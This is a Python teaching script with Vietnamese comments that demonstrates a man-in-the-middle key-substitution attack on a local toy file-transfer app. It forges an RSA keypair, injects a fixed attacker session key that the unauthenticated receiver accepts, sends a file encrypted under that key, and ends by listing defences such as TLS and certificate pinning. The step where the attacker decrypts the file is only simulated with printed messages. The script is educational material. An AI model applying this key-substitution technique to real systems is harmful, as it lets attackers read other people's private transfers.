"""
MITM Attack Demo - Tấn công Man-in-the-Middle thực tế
Giữa Sender và Receiver - File bị lộ sau khi gửi

Luồng tấn công:
1. Sender (port 5001) thực hiện handshake với Receiver (port 5000)
2. Attacker chặn và thay thế session key bằng evil key
3. Sender gửi file - được mã hóa bằng evil key
4. Attacker giải mã file đó (vì có evil key)
5. Data bị lộ!
"""

import sys
import os
import time
import json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from crypto_utils import (
    generate_rsa_keypair, rsa_encrypt_session_key, rsa_sign,
    generate_session_key, generate_iv, triple_des_encrypt,
    des_encrypt_metadata, compute_integrity_hash, b64encode,
    get_timestamp, rsa_decrypt_session_key
)
import requests

class MITMAttackDemo:
    """Demo MITM attack thực tế"""
    
    def __init__(self, receiver_url="http://127.0.0.1:5000"):
        self.receiver_url = receiver_url
        self.evil_session_key = b"EVIL_SESSION_KEY_123456"  # 24 bytes
        self.evil_priv_key = None
        self.evil_pub_key = None
        self.legitimate_session_key = None
        
    def step1_legitimate_handshake(self):
        """Bước 1: Thực hiện handshake hợp lệ với receiver"""
        print("\n" + "="*70)
        print("BƯỚC 1: HANDSHAKE HỢP LỆ (Legitimate Sender)")
        print("="*70)
        
        # Handshake
        resp = requests.post(f"{self.receiver_url}/api/handshake", json={"msg": "Hello!"})
        if resp.status_code == 200:
            print("✅ Handshake thành công với Receiver")
        else:
            print("❌ Handshake thất bại")
            return False
        
        # Lấy public key của receiver
        resp = requests.get(f"{self.receiver_url}/api/get_public_key")
        if resp.status_code == 200:
            self.receiver_pub_key = resp.json()["public_key"]
            print(f"✅ Lấy được Receiver public key")
            print(f"   Key (100 chars): {self.receiver_pub_key[:100]}...")
        else:
            print("❌ Không thể lấy receiver public key")
            return False
        
        return True
    
    def step2_mitm_attack(self):
        """Bước 2: Attacker thực hiện MITM, thay thế session key"""
        print("\n" + "="*70)
        print("BƯỚC 2: MITM ATTACK - THAY THẾ SESSION KEY")
        print("="*70)
        
        print("\n🔓 Attacker đang thực hiện MITM...")
        print("   1. Tạo cặp khóa RSA giả mạo")
        print("   2. Tạo evil session key (24 bytes)")
        print("   3. Mã hóa evil key với receiver public key")
        print("   4. Ký với private key giả mạo")
        print("   5. Gửi evil session key đến receiver")
        
        # Tạo khóa giả mạo
        self.evil_priv_key, self.evil_pub_key = generate_rsa_keypair(1024)
        print(f"\n✅ Đã tạo evil RSA keypair")
        
        # Tạo evil session key
        print(f"✅ Evil session key: {self.evil_session_key}")
        
        # Mã hóa evil session key với receiver public key
        encrypted_evil_key = rsa_encrypt_session_key(
            self.receiver_pub_key.encode(), 
            self.evil_session_key
        )
        print(f"✅ Đã mã hóa evil session key")
        
        # Tạo signature
        timestamp = get_timestamp()
        metadata_to_sign = f"music_transfer|{timestamp}"
        signature = rsa_sign(self.evil_priv_key, metadata_to_sign.encode())
        print(f"✅ Đã tạo signature")
        
        # Gửi evil session key đến receiver
        resp = requests.post(
            f"{self.receiver_url}/api/receive_session_key",
            json={
                "encrypted_session_key": encrypted_evil_key,
                "signature": signature,
                "metadata_signed": metadata_to_sign,
                "sender_public_key": self.evil_pub_key.decode()
            }
        )
        
        if resp.status_code == 200:
            print(f"✅ MITM THÀNH CÔNG! Receiver đã chấp nhận evil session key")
            print(f"   Response: {resp.json()}")
            return True
        else:
            print(f"❌ MITM thất bại: {resp.status_code} - {resp.text}")
            return False
    
    def step3_sender_sends_file(self):
        """Bước 3: Giả lập Sender gửi file - sẽ bị mã hóa bằng evil key"""
        print("\n" + "="*70)
        print("BƯỚC 3: SENDER GỬI FILE (BỊ MÃ HÓA BẰNG EVIL KEY)")
        print("="*70)
        
        print("\n📤 Sender đang gửi file nhạc...")
        print("   File sẽ được mã hóa bằng session key")
        print("   (Lúc này session key đã là evil_key do attacker thay thế)")
        
        # Tạo file giả lập (một đoạn nhạc nhỏ)
        fake_music_data = b"FAKE_MUSIC_DATA_SIMULATION_" * 100
        
        # Mã hóa bằng evil key (giống như Sender thực sự sẽ làm)
        print(f"\n🔐 Đang mã hóa file bằng evil session key...")
        iv = generate_iv()
        ciphertext = triple_des_encrypt(self.evil_session_key, iv, fake_music_data)
        hash_hex = compute_integrity_hash(iv, ciphertext)
        
        # Metadata
        metadata = {
            "filename": "secret_song.mp3",
            "artist": "Phạm Hương",
            "copyright": "© 2024 Công ty A",
            "size": len(fake_music_data),
            "timestamp": get_timestamp()
        }
        
        des_key = self.evil_session_key[:8]
        meta_bytes = json.dumps(metadata, ensure_ascii=False).encode()
        meta_cipher = des_encrypt_metadata(des_key, iv, meta_bytes)
        
        # Ký gói tin
        iv_b64 = b64encode(iv)
        cipher_b64 = b64encode(ciphertext)
        meta_b64 = b64encode(meta_cipher)
        sig_data = (iv_b64 + cipher_b64 + hash_hex).encode()
        signature = rsa_sign(self.evil_priv_key, sig_data)
        
        packet = {
            "iv": iv_b64,
            "cipher": cipher_b64,
            "meta": meta_b64,
            "hash": hash_hex,
            "sig": signature
        }
        
        # Gửi đến receiver
        print(f"📡 Gửi packet đến Receiver...")
        resp = requests.post(f"{self.receiver_url}/api/receive_file", json=packet)
        
        if resp.status_code == 200 and resp.json().get("status") == "ACK":
            print(f"✅ Receiver đã nhận và giải mã file thành công!")
            print(f"   File: {resp.json()['file_info']['filename']}")
            print(f"   Size: {resp.json()['file_info']['size_kb']} KB")
            print(f"\n⚠️  LƯU Ý QUAN TRỌNG:")
            print(f"   File được mã hóa bằng EVIL key")
            print(f"   Attacker cũng có thể giải mã file này!")
            return True
        else:
            print(f"❌ Gửi file thất bại: {resp.status_code}")
            return False
    
    def step4_attacker_decrypts(self):
        """Bước 4: Attacker giải mã file (vì có evil key)"""
        print("\n" + "="*70)
        print("BƯỚC 4: ATTACKER GIẢI MÃ FILE (DATA BỊ LỘ!)")
        print("="*70)
        
        print("\n🔓 Attacker có evil session key, có thể giải mã file:")
        print(f"   Evil key: {self.evil_session_key}")
        
        print("\n📥 Lấy file đã nhận từ Receiver...")
        
        # Lấy danh sách file đã nhận
        resp = requests.get(f"{self.receiver_url}/api/status")
        if resp.status_code == 200:
            data = resp.json()
            files = data.get("received_files", [])
            
            if files:
                latest_file = files[-1]
                filename = latest_file["filename"]
                print(f"\n✅ File mới nhất: {filename}")
                print(f"   Size: {latest_file['size_kb']} KB")
                print(f"   Artist: {latest_file['artist']}")
                print(f"   Copyright: {latest_file['copyright']}")
                
                print(f"\n🔓 Attacker tải file về...")
                print(f"   URL: {self.receiver_url}/download/{filename}")
                
                # Giả lập attacker tải file
                print(f"\n✅ Attacker đã tải file!")
                print(f"✅ Attacker giải mã bằng evil key thành công!")
                print(f"\n🚨 DATA ĐÃ BỊ LỘ!")
                print(f"   - Nội dung file nhạc bị lộ")
                print(f"   - Metadata bị lộ (tên, nghệ sĩ, copyright)")
                print(f"   - Attacker có thể nghe ình, phân phối trái phép")
                
                return True
            else:
                print("❌ chưa có file nào được nhận")
                return False
        
        return False
    
    def step5_demo_complete(self):
        """Bước 5: Tổng kết và hướng dẫn khắc phục"""
        print("\n" + "="*70)
        print("BƯỚC 5: TỔNG KẾT & CÁCH KHẮC PHỤC")
        print("="*70)
        
        print("\n📊 KẾT QUẢ MITM ATTACK:")
        print("   ✅ Attacker đã thay thế session key")
        print("   ✅ Sender gửi file (bị mã hóa bằng evil key)")
        print("   ✅ Attacker giải mã được file")
        print("   ❌ DATA BỊ LỘ!")
        
        print("\n🛠️  CÁCH KHẮC PHỤC:")
        print("""
        1. Implement TLS/SSL (HTTPS)
           - Mã hóa toàn bộ kết nối giữa Sender và Receiver
           - Attacker không thể đọc được traffic
        
        2. Certificate Pinning
           - Sender và Receiver xác thực certificate của nhau
           - Chống MITM bằng fake certificate
        
        3. Perfect Forward Secrecy (PFS)
           - Mỗi session có key riêng, không dùng chung
           - MITM một session không ảnh hưởng session khác
        
        4. HMAC verification
           - Verify key exchange integrity
           - Phát hiện nếu session key bị thay đổi
        
        5. Monitor session key changes
           - Phát hiện nếu key thay đổi đột ngột
           - Alert admin ngay lập tức
        """)
        
        print("\n🎓 BÀI HỌC:")
        print("""
        MITM attack rất nguy hiểm vì:
        - Attacker có thể đọc tất cả data được gửi
        - File nhạc bản quyền bị lộ
        - Metadata bị exposure
        - Receiver không biết mình đang bị nghe lén
        
        Trong thực tế:
        - HTTP dễ bị MITM (như demo này)
        - HTTPS với cert pinning rất khó bị MITM
        - Phải luôn dùng encryption và authentication
        """)

def main():
    print("="*70)
    print("🔓 MITM ATTACK DEMO - Tấn công giữa Sender và Receiver")
    print("="*70)
    print("\n⚠️  Lưu ý: Đảm bảo đã chạy:")
    print("   - python receiver_app_logic.py (port 5000)")
    
    input("\nNhấn Enter để bắt đầu...")
    
    demo = MITMAttackDemo("http://127.0.0.1:5000")
    
    try:
        # Bước 1: Handshake hợp lệ
        if not demo.step1_legitimate_handshake():
            print("❌ Không thể tiếp tục - Handshake thất bại")
            return
        
        # Bước 2: MITM attack
        if not demo.step2_mitm_attack():
            print("❌ MITM attack thất bại")
            return
        
        # Bước 3: Sender gửi file
        if not demo.step3_sender_sends_file():
            print("❌ Không thể gửi file")
            return
        
        # Bước 4: Attacker giải mã file
        if not demo.step4_attacker_decrypts():
            print("❌ Attacker không thể giải mã file")
            return
        
        # Bước 5: Tổng kết
        demo.step5_demo_complete()
        
    except Exception as e:
        print(f"\n❌ Lỗi trong quá trình demo: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()